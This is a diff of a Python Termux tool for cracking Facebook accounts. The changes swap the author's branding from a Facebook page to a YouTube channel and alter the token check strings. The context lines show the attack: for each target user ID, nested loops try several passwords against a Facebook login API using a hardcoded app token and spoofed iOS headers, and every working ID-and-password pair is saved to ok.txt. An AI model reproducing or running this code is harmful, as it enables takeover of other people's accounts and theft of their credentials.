@@ -43,7 +43,7 @@ loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 
 def linex():
 	os.system('echo  "\n ★━━━━━━━━★━━━━━━━━━━━━━━━━━━━━★━━━━━━━━━━━★\n" | lolcat -a -d 2 -s 50')
 def logo():
-	os.system('echo "\n  *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n   *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n   *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n    *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n    *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n        *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  \n    ・．━━━━━━━━━━━━ † ━━━━━━━━━━━━．・\n    ☆ Author: ALI RAZA        ☆\n    ☆ Fb page   : Ar Termux Trick        ☆\n    ☆ Whatsapp   : +923047269778     ║\n    ・．━━━━━━━━━━━━ † ━━━━━━━━━━━━．・" | lolcat -a -d 2 -s 50')	
+	os.system('echo "\n░█████╗░██╗░░░░░██╗\n██╔══██╗██║░░░░░██║\n███████║██║░░░░░██║\n██╔══██║██║░░░░░██║\n██║░░██║███████╗██║\n╚═╝░░╚═╝╚══════╝╚═╝\n    *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n    *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n        *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  \n    ・．━━━━━━━━━━━━ † ━━━━━━━━━━━━．・\n    ☆ Author: ALI RAZA        ☆\n    ☆ Yt Channel   : Technical Raza        ☆\n    ☆ Whatsapp   : +923047269778     \n    ・．━━━━━━━━━━━━ † ━━━━━━━━━━━━．・" | lolcat -a -d 2 -s 50')	
 
 def main():
 	os.system("clear")
@@ -53,7 +53,7 @@ def main():
 	print("\033[92;1m  [1] START CRACK")
 	print("\033[93;1m  [2] HOW TO GET ACCESS TOKEN")
 	print("\033[94;1m  [3] UPDATE TOOL")
-	print("\033[96;1m  [J] FOLLOW PAGE. AR TERMUX TRICK \033[92;1m✘\033[91;1m✘")
+	print("\033[96;1m  [J] Subscribe My Channel. Technical Raza \033[92;1m♬\033[91;1m♬")
 	print("\033[90;1m  [0] EXIT")
 	print("")
 	log_sel()
@@ -66,7 +66,7 @@ def log_sel():
 	elif sel =="1" or sel =="01":
 		token()
 	elif sel =="2" or sel =="02":
-		subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100065434664869"])
+		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw"])
 		main()
 	elif sel =="3" or sel =="03":
 		import os
@@ -82,10 +82,10 @@ def log_sel():
 			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
 	        	main()
 	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
-		subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100065434664869"])
+		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw"])
 		main()
 	elif sel =="0" or sel =="00":
-		xox("\n\t\033[91;1m GOOD BYE SEE YOU AGAIN :)")
+		xox("\n\t\033[91;1m ALLAH HAFIZ SEE YOU AGAIN :)")
 		sys.exit()
 	else:
 		print("")
@@ -279,7 +279,7 @@ def crack_select1():
 			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 			data = requests.get(api, params=params, headers=headers_)
 			if "access_token" in data.text and "EAAA" in data.text:
-				print(" \033[1;32m[ALI-★] "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;32m[ALI-OK] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
@@ -297,8 +297,8 @@ def crack_select1():
 					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass2, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 					data = requests.get(api, params=params, headers=headers_)
-					if "access_token" in data.text and "EAAA" in data.text:
-						print(" \033[1;32m[ALI-★] "+uid+" | "+pass2+"\033[0;97m")
+					if "access_token" in data.text and "EAAAA" in data.text:
+						print(" \033[1;32m[ALI-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
@@ -316,8 +316,8 @@ def crack_select1():
 							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 							data = requests.get(api, params=params, headers=headers_)
-							if "access_token" in data.text and "EAAA" in data.text:
-								print(" \033[1;32m[ALI-★] "+uid+" | "+pass3+"\033[0;97m")
+							if "access_token" in data.text and "EAAAA" in data.text:
+								print(" \033[1;32m[ALI-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
@@ -335,8 +335,8 @@ def crack_select1():
 									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass4, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 									data = requests.get(api, params=params, headers=headers_)
-									if "access_token" in data.text and "EAAA" in data.text:
-										print(" \033[1;32m[ALI-★] "+uid+" | "+pass4+"\033[0;97m")
+									if "access_token" in data.text and "EAAAA" in data.text:
+										print(" \033[1;32m[ALI-OK] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
@@ -354,8 +354,8 @@ def crack_select1():
 											params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass5, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 											data = requests.get(api, params=params, headers=headers_)
-											if "access_token" in data.text and "EAAA" in data.text:
-												print(" \033[1;32m[ALI-★] "+uid+" | "+pass5+"\033[0;97m")
+											if "access_token" in data.text and "EAAAA" in data.text:
+												print(" \033[1;32m[ALI-OK] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
@@ -373,8 +373,8 @@ def crack_select1():
 													params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass6, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 													data = requests.get(api, params=params, headers=headers_)
-													if "access_token" in data.text and "EAAA" in data.text:
-														print(" \033[1;32m[ALI-★] "+uid+" | "+pass6+"\033[0;97m")
+													if "access_token" in data.text and "EAAAA" in data.text:
+														print(" \033[1;32m[ALI-OK] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
@@ -392,8 +392,8 @@ def crack_select1():
 															params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass7, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 															data = requests.get(api, params=params, headers=headers_)
-															if "access_token" in data.text and "EAAA" in data.text:
-																print(" \033[1;32m[ALI-★] "+uid+" | "+pass7+"\033[0;97m")
+															if "access_token" in data.text and "EAAAA" in data.text:
+																print(" \033[1;32m[ALI-OK] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
@@ -411,8 +411,8 @@ def crack_select1():
 																	params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass8, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 																	headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 																	data = requests.get(api, params=params, headers=headers_)
-																	if "access_token" in data.text and "EAAA" in data.text:
-																		print(" \033[1;32m[ALI-★] "+uid+" | "+pass8+"\033[0;97m")
+																	if "access_token" in data.text and "EAAAA" in data.text:
+																		print(" \033[1;32m[ALI-OK] "+uid+" | "+pass8+"\033[0;97m")
 																		ok = open("ok.txt", "a")
 																		ok.write(uid+"|"+pass8+"\n")
 																		ok.close()
@@ -552,8 +552,8 @@ def crack_select():
 			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass1, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 			data = requests.get(api, params=params, headers=headers_)
-			if "access_token" in data.text and "EAAA" in data.text:
-				print(" \033[1;32m[ALI-★] "+uid+" | "+pass1+"\033[0;97m")
+			if "access_token" in data.text and "EAAAA" in data.text:
+				print(" \033[1;32m[ALI-OK] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
@@ -571,8 +571,8 @@ def crack_select():
 					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass2, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 					data = requests.get(api, params=params, headers=headers_)
-					if "access_token" in data.text and "EAAA" in data.text:
-						print(" \033[1;32m[ALI-★] "+uid+" | "+pass2+"\033[0;97m")
+					if "access_token" in data.text and "EAAAA" in data.text:
+						print(" \033[1;32m[ALI-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
@@ -590,8 +590,8 @@ def crack_select():
 							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 							data = requests.get(api, params=params, headers=headers_)
-							if "access_token" in data.text and "EAAA" in data.text:
-								print(" \033[1;32m[ALI-★] "+uid+" | "+pass3+"\033[0;97m")
+							if "access_token" in data.text and "EAAAA" in data.text:
+								print(" \033[1;32m[ALI-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
@@ -609,8 +609,8 @@ def crack_select():
 									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass4, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 									data = requests.get(api, params=params, headers=headers_)
-									if "access_token" in data.text and "EAAA" in data.text:
-										print(" \033[1;32m[ALI-★] "+uid+" | "+pass4+"\033[0;97m")
+									if "access_token" in data.text and "EAAAA" in data.text:
+										print(" \033[1;32m[ALI-OK] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
@@ -628,8 +628,8 @@ def crack_select():
 											params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass5, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 											data = requests.get(api, params=params, headers=headers_)
-											if "access_token" in data.text and "EAAA" in data.text:
-												print(" \033[1;32m[ALI-★] "+uid+" | "+pass5+"\033[0;97m")
+											if "access_token" in data.text and "EAAAA" in data.text:
+												print(" \033[1;32m[ALI-OK] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
@@ -647,8 +647,8 @@ def crack_select():
 													params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass6, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 													data = requests.get(api, params=params, headers=headers_)
-													if "access_token" in data.text and "EAAA" in data.text:
-														print(" \033[1;32m[ALI-★] "+uid+" | "+pass6+"\033[0;97m")
+													if "access_token" in data.text and "EAAAA" in data.text:
+														print(" \033[1;32m[ALI-OK] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
@@ -666,8 +666,8 @@ def crack_select():
 															params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass7, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 															data = requests.get(api, params=params, headers=headers_)
-															if "access_token" in data.text and "EAAA" in data.text:
-																print(" \033[1;32m[ALI-★] "+uid+" | "+pass7+"\033[0;97m")
+															if "access_token" in data.text and "EAAAA" in data.text:
+																print(" \033[1;32m[ALI-OK] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
